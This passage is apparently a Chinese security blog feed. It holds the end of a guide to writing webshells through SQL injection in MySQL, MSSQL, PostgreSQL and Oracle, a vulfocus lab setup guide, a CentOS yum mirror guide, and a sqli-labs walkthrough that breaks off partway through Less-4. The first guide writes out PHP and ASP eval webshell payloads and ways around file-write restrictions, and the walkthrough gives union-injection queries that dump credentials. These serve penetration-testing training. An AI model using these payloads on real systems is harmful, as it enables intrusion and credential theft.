<code>/var/www/html/</code>）。</li><li>可能需要找到可写目录：<ul><li><strong>Windows</strong>：<code>C:\inetpub\wwwroot\</code>、<code>C:\xampp\htdocs\</code></li><li><strong>Linux</strong>：<code>/var/www/html/</code>、<code>/usr/local/apache/htdocs/</code></li></ul></li></ul><p>如果数据库用户没有<strong>写入 Web 目录的权限</strong>，写 Shell 会失败。</p><hr><p><strong>3. 目标环境能解析 WebShell</strong></p><ul><li><strong>PHP 环境</strong>（Apache、Nginx）：可以写入 <code>.php</code> 文件。</li><li><strong>ASP&#x2F;ASP.NET 环境</strong>（IIS）：可以写入 <code>.asp</code> 或 <code>.aspx</code> 文件。</li><li><strong>JSP 环境</strong>（Tomcat、Jboss）：可以写入 <code>.jsp</code> 文件。</li></ul><p>如果写入 <code>.txt</code>、<code>.log</code> 等，Web 服务器不会执行，而是作为普通文件下载。</p><hr><p><strong>4. 具体的 SQL 注入写 Shell 方法</strong></p><p><strong>1）MySQL 写 Shell</strong></p><p><strong>条件：</strong></p><ul><li>需要 <code>FILE</code> 权限</li><li>服务器开启 <code>secure_file_priv=&#39;&#39;</code>（或指向可写目录）</li></ul><p><strong>利用 <code>INTO OUTFILE</code>：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>利用 <code>LOAD DATA INFILE</code>：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/tmp/shell.txt&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> shell;</span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><ul><li><code>secure_file_priv</code> 可能限制写入路径</li><li>目标环境可能禁用了 <code>INTO OUTFILE</code></li></ul><hr><p><strong>2）MSSQL 写 Shell</strong></p><p><strong>条件：</strong></p><ul><li>需要 <code>xp_cmdshell</code> 开启（默认关闭）</li><li>IIS 允许解析 <code>.asp</code> 或 <code>.aspx</code></li></ul><p><strong>开启 <code>xp_cmdshell</code>（如果被禁用）：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><strong>使用 <code>echo</code> 写入 ASP Shell：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo &lt;%eval request(&quot;cmd&quot;)%&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>使用 <code>bcp</code> 方式写入：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;bcp &quot;echo &lt;%eval request(&quot;cmd&quot;)%&gt;&quot; queryout C:\inetpub\wwwroot\shell.asp -c&#x27;</span>;</span><br></pre></td></tr></table></figure><hr><p><strong>3）PostgreSQL 写 Shell</strong></p><p><strong>条件：</strong></p><ul><li><code>COPY</code> 语句需要 <code>superuser</code> 权限</li><li>目标 Web 目录可写</li></ul><p><strong>使用 <code>COPY</code> 写入 WebShell：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>) <span class="keyword">TO</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>如果 <code>COPY</code> 被限制，可以用 <code>lo_export</code>：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_export(oid, <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>) <span class="keyword">FROM</span> pg_largeobject;</span><br></pre></td></tr></table></figure><hr><p><strong>4）Oracle 写 Shell</strong></p><p><strong>条件：</strong></p><ul><li><code>UTL_FILE</code> 需要写入权限</li><li>需要 DBA 级别的权限</li></ul><p><strong>写入 WebShell：</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  f UTL_FILE.FILE_TYPE;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  f :<span class="operator">=</span> UTL_FILE.FOPEN(<span class="string">&#x27;/var/www/html/&#x27;</span>, <span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">  UTL_FILE.PUT_LINE(f, <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line">  UTL_FILE.FCLOSE(f);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><hr><p><strong>5. 其他方法</strong></p><p><strong>1）日志文件写入 WebShell</strong></p><p>如果数据库本身<strong>没有写文件权限</strong>，但日志文件<strong>可控并且可执行</strong>，可以通过 <strong>日志注入</strong> 方式写入 WebShell。</p><p><strong>方法：修改 MySQL 日志</strong></p><p><strong>开启 general_log 并写入 Shell</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> &quot;/var/www/html/shell.php&quot;;</span><br><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;;</span><br></pre></td></tr></table></figure><hr><p><strong>2）内存 UDF（User Defined Function）提权</strong></p><p>如果数据库<strong>不能直接写文件</strong>，但可以执行动态链接库（DLL），可以：</p><ul><li><strong>上传 UDF</strong> 到数据库目录</li><li><strong>创建自定义函数</strong> 调用 Shell</li></ul><p><strong>MSSQL 提权</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> exec_cmd(<span class="variable">@cmd</span> NVARCHAR(<span class="number">4000</span>)) <span class="keyword">RETURNS</span> <span class="type">INT</span> <span class="keyword">AS</span> <span class="keyword">EXTERNAL</span> NAME [dbo.xp_cmdshell];</span><br><span class="line"><span class="keyword">SELECT</span> exec_cmd(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><hr><p><strong>6. 绕过安全限制</strong></p><p><strong>1）绕过 <code>secure_file_priv</code></strong></p><p>如果 MySQL 限制 <code>secure_file_priv</code>：</p><ul><li><p><strong>查看当前限制路径</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>寻找 Web 目录是否可写</strong></p><ul><li><code>/tmp/</code></li><li><code>/var/www/html/</code></li><li><code>C:\xampp\htdocs\</code></li></ul></li></ul><p><strong>2）绕过 <code>xp_cmdshell</code> 限制</strong></p><p>如果 <code>xp_cmdshell</code> 被禁用：</p><ul><li><p><strong>尝试 SQL Server Job</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> msdb.dbo.sp_add_job <span class="variable">@job_name</span><span class="operator">=</span><span class="string">&#x27;testjob&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> msdb.dbo.sp_add_jobstep <span class="variable">@job_name</span><span class="operator">=</span><span class="string">&#x27;testjob&#x27;</span>, <span class="variable">@command</span><span class="operator">=</span><span class="string">&#x27;cmd /c whoami&#x27;</span>, <span class="variable">@step_id</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXEC</span> msdb.dbo.sp_start_job <span class="variable">@job_name</span><span class="operator">=</span><span class="string">&#x27;testjob&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><strong>3）绕过 <code>open_basedir</code> 限制</strong></p><p>如果 PHP <strong><code>open_basedir</code></strong> 限制文件访问：</p><ul><li><p>尝试 <strong><code>phar://</code></strong> 伪协议</p></li><li><p>上传 <code>.htaccess</code> 解除限制</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">on</span></span><br></pre></td></tr></table></figure></li></ul><hr><p><strong>7. 关键防御措施</strong></p><ul><li><strong>禁用 <code>INTO OUTFILE</code></strong></li><li><strong>限制 <code>secure_file_priv</code></strong></li><li><strong>禁用 <code>xp_cmdshell</code></strong></li><li><strong>最小化数据库用户权限</strong></li><li><strong>Web 目录禁止写入</strong></li><li><strong>日志监控 SQL 注入行为</strong></li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>✅ <strong>SQL 注入写 Shell 的核心条件</strong>：</p><ol><li><strong>数据库支持写文件</strong></li><li><strong>Web 目录可写</strong></li><li><strong>Web 服务器解析 Shell</strong></li><li><strong>绕过数据库和系统的安全限制</strong></li></ol><p>✅ <strong>不同数据库的写 Shell 方法</strong>：</p><table><thead><tr><th>数据库</th><th>写入方式</th><th>适用环境</th></tr></thead><tbody><tr><td>MySQL</td><td><code>INTO OUTFILE</code> &#x2F; <code>LOAD DATA</code></td><td>需 <code>FILE</code> 权限</td></tr><tr><td>MSSQL</td><td><code>xp_cmdshell</code> &#x2F; <code>bcp</code></td><td>需 <code>sysadmin</code> 权限</td></tr><tr><td>PostgreSQL</td><td><code>COPY TO</code></td><td>需 <code>superuser</code></td></tr><tr><td>Oracle</td><td><code>UTL_FILE</code></td><td>需 DBA 级别权限</td></tr></tbody></table><p>✅ <strong>特殊绕过方式</strong>：</p><ul><li><strong>日志文件注入</strong></li><li><strong>内存 UDF 提权</strong></li><li><strong>时间盲注写入</strong></li></ul><p>如果数据库配置严格，SQLi <strong>直接写 Shell 难度较大</strong>，但可以结合<strong>文件包含漏洞</strong>或<strong>日志注入</strong>绕过限制。</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulfocus靶机环境搭建部署</title>
      <link href="/2025/05/27/vulfocus%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E9%83%A8%E7%BD%B2/"/>
      <url>/2025/05/27/vulfocus%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="vulfocus介绍"><a href="#vulfocus介绍" class="headerlink" title="vulfocus介绍"></a>vulfocus介绍</h1><p>vulfocus 本质上是一个漏洞集成平台，里面集成了大量的CVE漏洞环境，采用的是docker环境部署安装，使用起来方便，可作为一个优秀靶场环境，提升实战能力。可本地部署安装，也可以直接使用线上环境</p><p>这里使用kali来进行docker部署</p><p>关于docker换源：（2024最新源）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>替换内容为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">&quot;https://docker.hpcloud.cloud&quot;,</span><br><span class="line">&quot;https://docker.m.daocloud.io&quot;,</span><br><span class="line"> &quot;https://docker.unsee.tech&quot;,</span><br><span class="line">&quot;https://docker.1panel.live&quot;,</span><br><span class="line">&quot;http://mirrors.ustc.edu.cn&quot;,</span><br><span class="line">&quot;https://docker.chenby.cn&quot;,</span><br><span class="line">&quot;http://mirror.azure.cn&quot;,</span><br><span class="line">&quot;https://dockerpull.org&quot;,</span><br><span class="line">&quot;https://dockerhub.icu&quot;,</span><br><span class="line">&quot;https://hub.rat.dev&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存之后重启docker服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="运行vulfocus"><a href="#运行vulfocus" class="headerlink" title="运行vulfocus"></a>运行vulfocus</h1><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>在任何路径下运行都可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547421827-34d77bd5-78fd-469d-87fc-68b1edae49f8.png"></p><p>查看是否拉取成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547488248-80fe1a26-b323-4301-a224-a111efbbd149.png"></p><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker create -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=172.17.0.1 vulfocus/vulfocus</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547521789-1d794f77-e04f-4b49-9285-942358a6dd73.png"></p><p>列出所有容器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547541081-567aba6e-7654-4690-aa7b-dddb01a9b906.png"></p><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start efbb38c04782</span><br></pre></td></tr></table></figure><blockquote><p>后面为对应的容器id，需要根据实际情况进行更改</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547703303-ccf4dda0-a761-4a68-9c75-9b65fc13e219.png"></p><h2 id="访问vulfocus"><a href="#访问vulfocus" class="headerlink" title="访问vulfocus"></a>访问vulfocus</h2><p>本机浏览器访问kali的ip地址，默认80端口，账户密码都为admin</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547782833-61e92782-fc9a-4513-bc19-c9b490e2c764.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547817401-91464ced-17b4-4485-8d58-d4fec6077c34.png"></p><h1 id="运行vulfocus-1"><a href="#运行vulfocus-1" class="headerlink" title="运行vulfocus"></a>运行vulfocus</h1><p>添加镜像，点击一键同步即可同步官网镜像</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547864616-6f1deaed-9c8e-48ca-8d63-5210128b1612.png"></p><p>使用时在镜像管理中点击下载即可，但下载时间较长</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734547913093-71829c8b-b75a-494a-8939-aba4e4b6f655.png"></p><p>出现添加成功之后，在首页即可看到镜像，并可以启用靶场环境</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1734548030678-1323ca7b-f5f3-4efe-a87c-3f824e937be3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS更换yum源</title>
      <link href="/2025/05/09/CentOS%E6%9B%B4%E6%8D%A2yum%E6%BA%90/"/>
      <url>/2025/05/09/CentOS%E6%9B%B4%E6%8D%A2yum%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Yum简介"><a href="#Yum简介" class="headerlink" title="Yum简介"></a>Yum简介</h1><p>Yum是一个Shell前端软件包管理器。基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包。</p><p>更换yum源是为了使用yum下载软件速度变快，默认的yum源为国外，下载速度较慢，使用国内镜像源可以解决这一问题。</p><h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><blockquote><p>下述操作均要以root权限执行</p></blockquote><ol><li>进入yum配置文件路径</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/yum.repos.d</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719019664179-b4c68478-d742-44ee-99dd-007b7ca6be33.png"></p><p>yum 的配置文件在 <code>/etc/yum.repos.d</code>目录下, 其中有多个配置文件，每一个配置文件中都可以配置一个或多个repository，但是最终会被合并为一个交给系统，所以多个文件只是为了方便管理。</p><ol start="2"><li><font style="color:rgb(34, 34, 34);">备份系统自带的yum源</font></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv CentOS-Base.repo CentOS-Base.repo.bk</span><br><span class="line">//mv重命名文件</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719019788953-c9cf55c0-3538-4a27-a262-e3f6f37d6dcc.png"></p><ol start="3"><li>下载阿里云的yum源配置文件到&#x2F;etc&#x2F;yum.repos.d&#x2F;</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">//使用wget下载镜像文件</span><br></pre></td></tr></table></figure><blockquote><p>-O参数介绍</p><p>方便以不同的文件名保存</p><p>wget默认会以最后一个符合”&#x2F;”的后面的字符来命名，对于动态链接的下载通常文件名会不正确</p><p>wget <a href="http://www.minjieren.com/download?id=1">http://www.minjieren.com/download?id=1</a><br>下面的例子会下载一个文件并以名称download.aspx?id&#x3D;1080保存，即使下载的文件是zip格式，它仍然以download.php?id&#x3D;1080命名</p><p>为了解决这个问题，我们可以使用参数-O来指定一个文件名：</p><p>wget -O wordpress.zip <a href="http://www.minjieren.com/download.aspx?id=1080">http://www.minjieren.com/download.aspx?id=1080</a></p><p>此时我们就可以将下载后的文件以wordpress.zip命名</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719019923122-20ad2f0c-aefe-433b-b333-333293846da2.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719020227899-42ba0588-457c-468e-9bd4-466023991ed3.png"></p><ol start="4"><li>清理yum缓存</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719020262207-08575e3d-35f7-44f0-830a-52ff8e3f5e38.png"></p><ol start="5"><li>生成新的缓存</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719020589273-13cd6650-c538-4bce-a00a-d6b34d13db9a.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719020610591-db36af55-11f1-4cff-94e0-eb128f5df806.png"></p><blockquote><p>在更改Linux的yum源后，清除和更新yum缓存是为了确保系统使用新的源信息进行软件包管理。具体原因如下：</p><ol><li>确保最新的软件包信息：Yum缓存存储了软件包的信息，包括可用的软件包列表和依赖关系。当你更改yum源后，缓存中可能仍然存在旧源的信息。如果不清除缓存，yum可能会继续使用这些过期的数据，从而导致安装或更新软件包时出现问题。</li><li>避免冲突和错误：如果不清除缓存，旧的缓存信息可能与新的源中的信息不一致，导致包依赖关系不正确或冲突，从而引发错误。</li><li>同步软件包索引：新的源可能包含不同的软件包版本或额外的软件包。通过更新缓存，确保你的系统能够识别和使用这些新的软件包。</li></ol></blockquote><ol start="6"><li>更新yum源检查是否生效</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719020690670-928ff6fa-326d-42f4-8f06-f77e01534f2f.png"></p><p>已生效，更新成功</p><p>查看yum源列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum repolist</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719021695154-a7f8570c-096a-48d1-bcf2-81d54008e146.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs 1-22关思路</title>
      <link href="/2025/05/09/sqlilabs%201-22%E5%85%B3%E6%80%9D%E8%B7%AF/"/>
      <url>/2025/05/09/sqlilabs%201-22%E5%85%B3%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719758351837-43ebb033-8200-42df-9dc3-0a0866d57105.png"></p><p>输入?id&#x3D;1</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719758381927-99e3e189-bd8b-437c-8219-3c717d4ba52f.png"></p><p>输入1’，报错，存在注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719758444366-d81c6d3a-9a7f-4eb5-a0a7-0bac2b1e6379.png"></p><ul><li>判断注入类型：</li></ul><p>输入1 and 1&#x3D;1和1 and 1&#x3D;2页面都正常，不是数字型注入，输入1’ and ‘1’&#x3D;’1页面正常，输入1’ and ‘1’&#x3D;’2页面显示不同，确定为字符型注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719758564480-7e1199e2-4390-4f3b-bc4a-1d3d106e5102.png"></p><ul><li>判断字段数：</li></ul><p>当order by 4 出现报错，字段数为3（由于是字符型注入，不要忘记加注释符）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719758921357-b254a6e8-66c5-4746-90fe-94a4a55d8e13.png"></p><ul><li>确定显示位：</li></ul><p>使用联合查询注入，结果分别为2和3</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719759019277-1fa9ef79-2a44-4f44-905b-883cda00aa09.png"></p><p>获取当前数据库名和版本号：</p><p>数据库名为security，版本号为5.5.53<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719759175221-b031b833-f49d-43cc-8447-a2fa571c35bb.png"></p><ul><li>获取表名：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p>有四张表，同时有users表</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719759535579-02fb1144-9f94-4c1d-a97b-9823dfc3ceb5.png"></p><ul><li>获取列名：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p>发现有username，password字段</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719759670239-5977fede-da6b-43cb-b788-a13b257e1306.png"></p><ul><li>获取具体数据</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;.&#x27;,password) from users --+</span><br></pre></td></tr></table></figure><blockquote><p>用group_concat函数将字段值拼接为字符串</p></blockquote><p>可以得到username和password字段的值，这里用.将username和password分隔开了方便查看</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719759834669-5e047523-50a9-48ef-a2c6-658352299250.png"></p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719760104913-4ba765b5-8720-4d2b-957c-c2c89eff624e.png"></p><p>输入?id&#x3D;1</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719760142821-c58b04fd-b4ff-46bd-aacb-8f19ae29c420.png"></p><p>id&#x3D;1’报错，存在注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719760184250-ac3f24ed-7b94-4360-96ad-99646d627317.png"></p><ul><li>判断注入类型</li></ul><p>输入1 and 1&#x3D;1正常，1 and 1&#x3D;2页面返回空白，确定为数字型注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719760261444-b464d719-3822-4c00-91cf-e9654dd20294.png"></p><p>其余注入步骤和Less-1相同（除了不需要加注释符）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(username,&#x27;.&#x27;,password) from users</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719761296495-69de1b0c-db31-4e73-bed8-1351485484c7.png"></p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719761350283-106cf15f-cd51-42e3-a7ab-b9f65e4b11ac.png"></p><p>输入?id&#x3D;1</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719761408588-86461dac-e28f-4b95-877f-21f09ab42b4c.png"></p><p>?id&#x3D;1’报错，存在注入，同时我们看到有一个），说明查询语句中有一个），我们要考虑这个括号</p><p>是通过<code>&#39;)</code>来闭合的</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719761565285-8cbeccb7-6e3b-41a4-8f37-947a1edba887.png"></p><blockquote><p>说明数据库的查询语句为</p><p>id&#x3D;(‘$id’) LIMIT 0,1</p></blockquote><p>确定注入类型：</p><p>输入1 and 1&#x3D;1和1 and 1&#x3D;2页面回显正常，排除数字型</p><p>输入1’ and ‘1’&#x3D;’1页面回显正常，1’ and ‘1’&#x3D;’2页面回显空白，确定为字符型</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719761685886-47deb5ec-0101-4b5f-b933-b6964be3beba.png"></p><p>接下来的步骤和Less-1相同</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">?id=1&#x27;) order by 4--+</span><br><span class="line">确定显示位</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">查询数据库名及版本号</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">查询表名</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">查询列名</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">查询具体数据</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;.&#x27;,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719762444018-fdb7d302-3324-443b-a097-9e4d0f402247.png"></p><p>我们查看Less-3的数据库源代码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719762565294-fc761a1a-9444-4611-a2da-94995a65bcfc.png"></p><p>可以看到是需要通过<code>&#39;)</code>来进行闭合</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719762710039-8bd2ed9c-e29a-43d7-9fd9-fbfff2d61765.png"></p><p>当我们输入?id&#x3D;1，?id&#x3D;1’页面返回都正常，我们输入?id&#x3D;”页面返回报错，说明为双引号字符型注入，同时还需要括号进行闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719762861483-f7799790-5116-4bd3-ad2d-b8b4484568d5.png"></p><p>输入?id&#x3D;1” and “1”&#x3D;”2页面返回空白，确定为双引号字符型注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719762930052-5cc78829-9043-4504-97c5-c053285ec311.png"></p><p>接下来的步骤和Less-3类似（将<code>1&#39;)</code>换成<code>1&quot;)</code>即可）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">?id=1&quot;) order by 4--+</span><br><span class="line">确定显示位</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">查询数据库名及版本号</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">查询表名</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">查询列名</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">查询具体数据</span><br><span 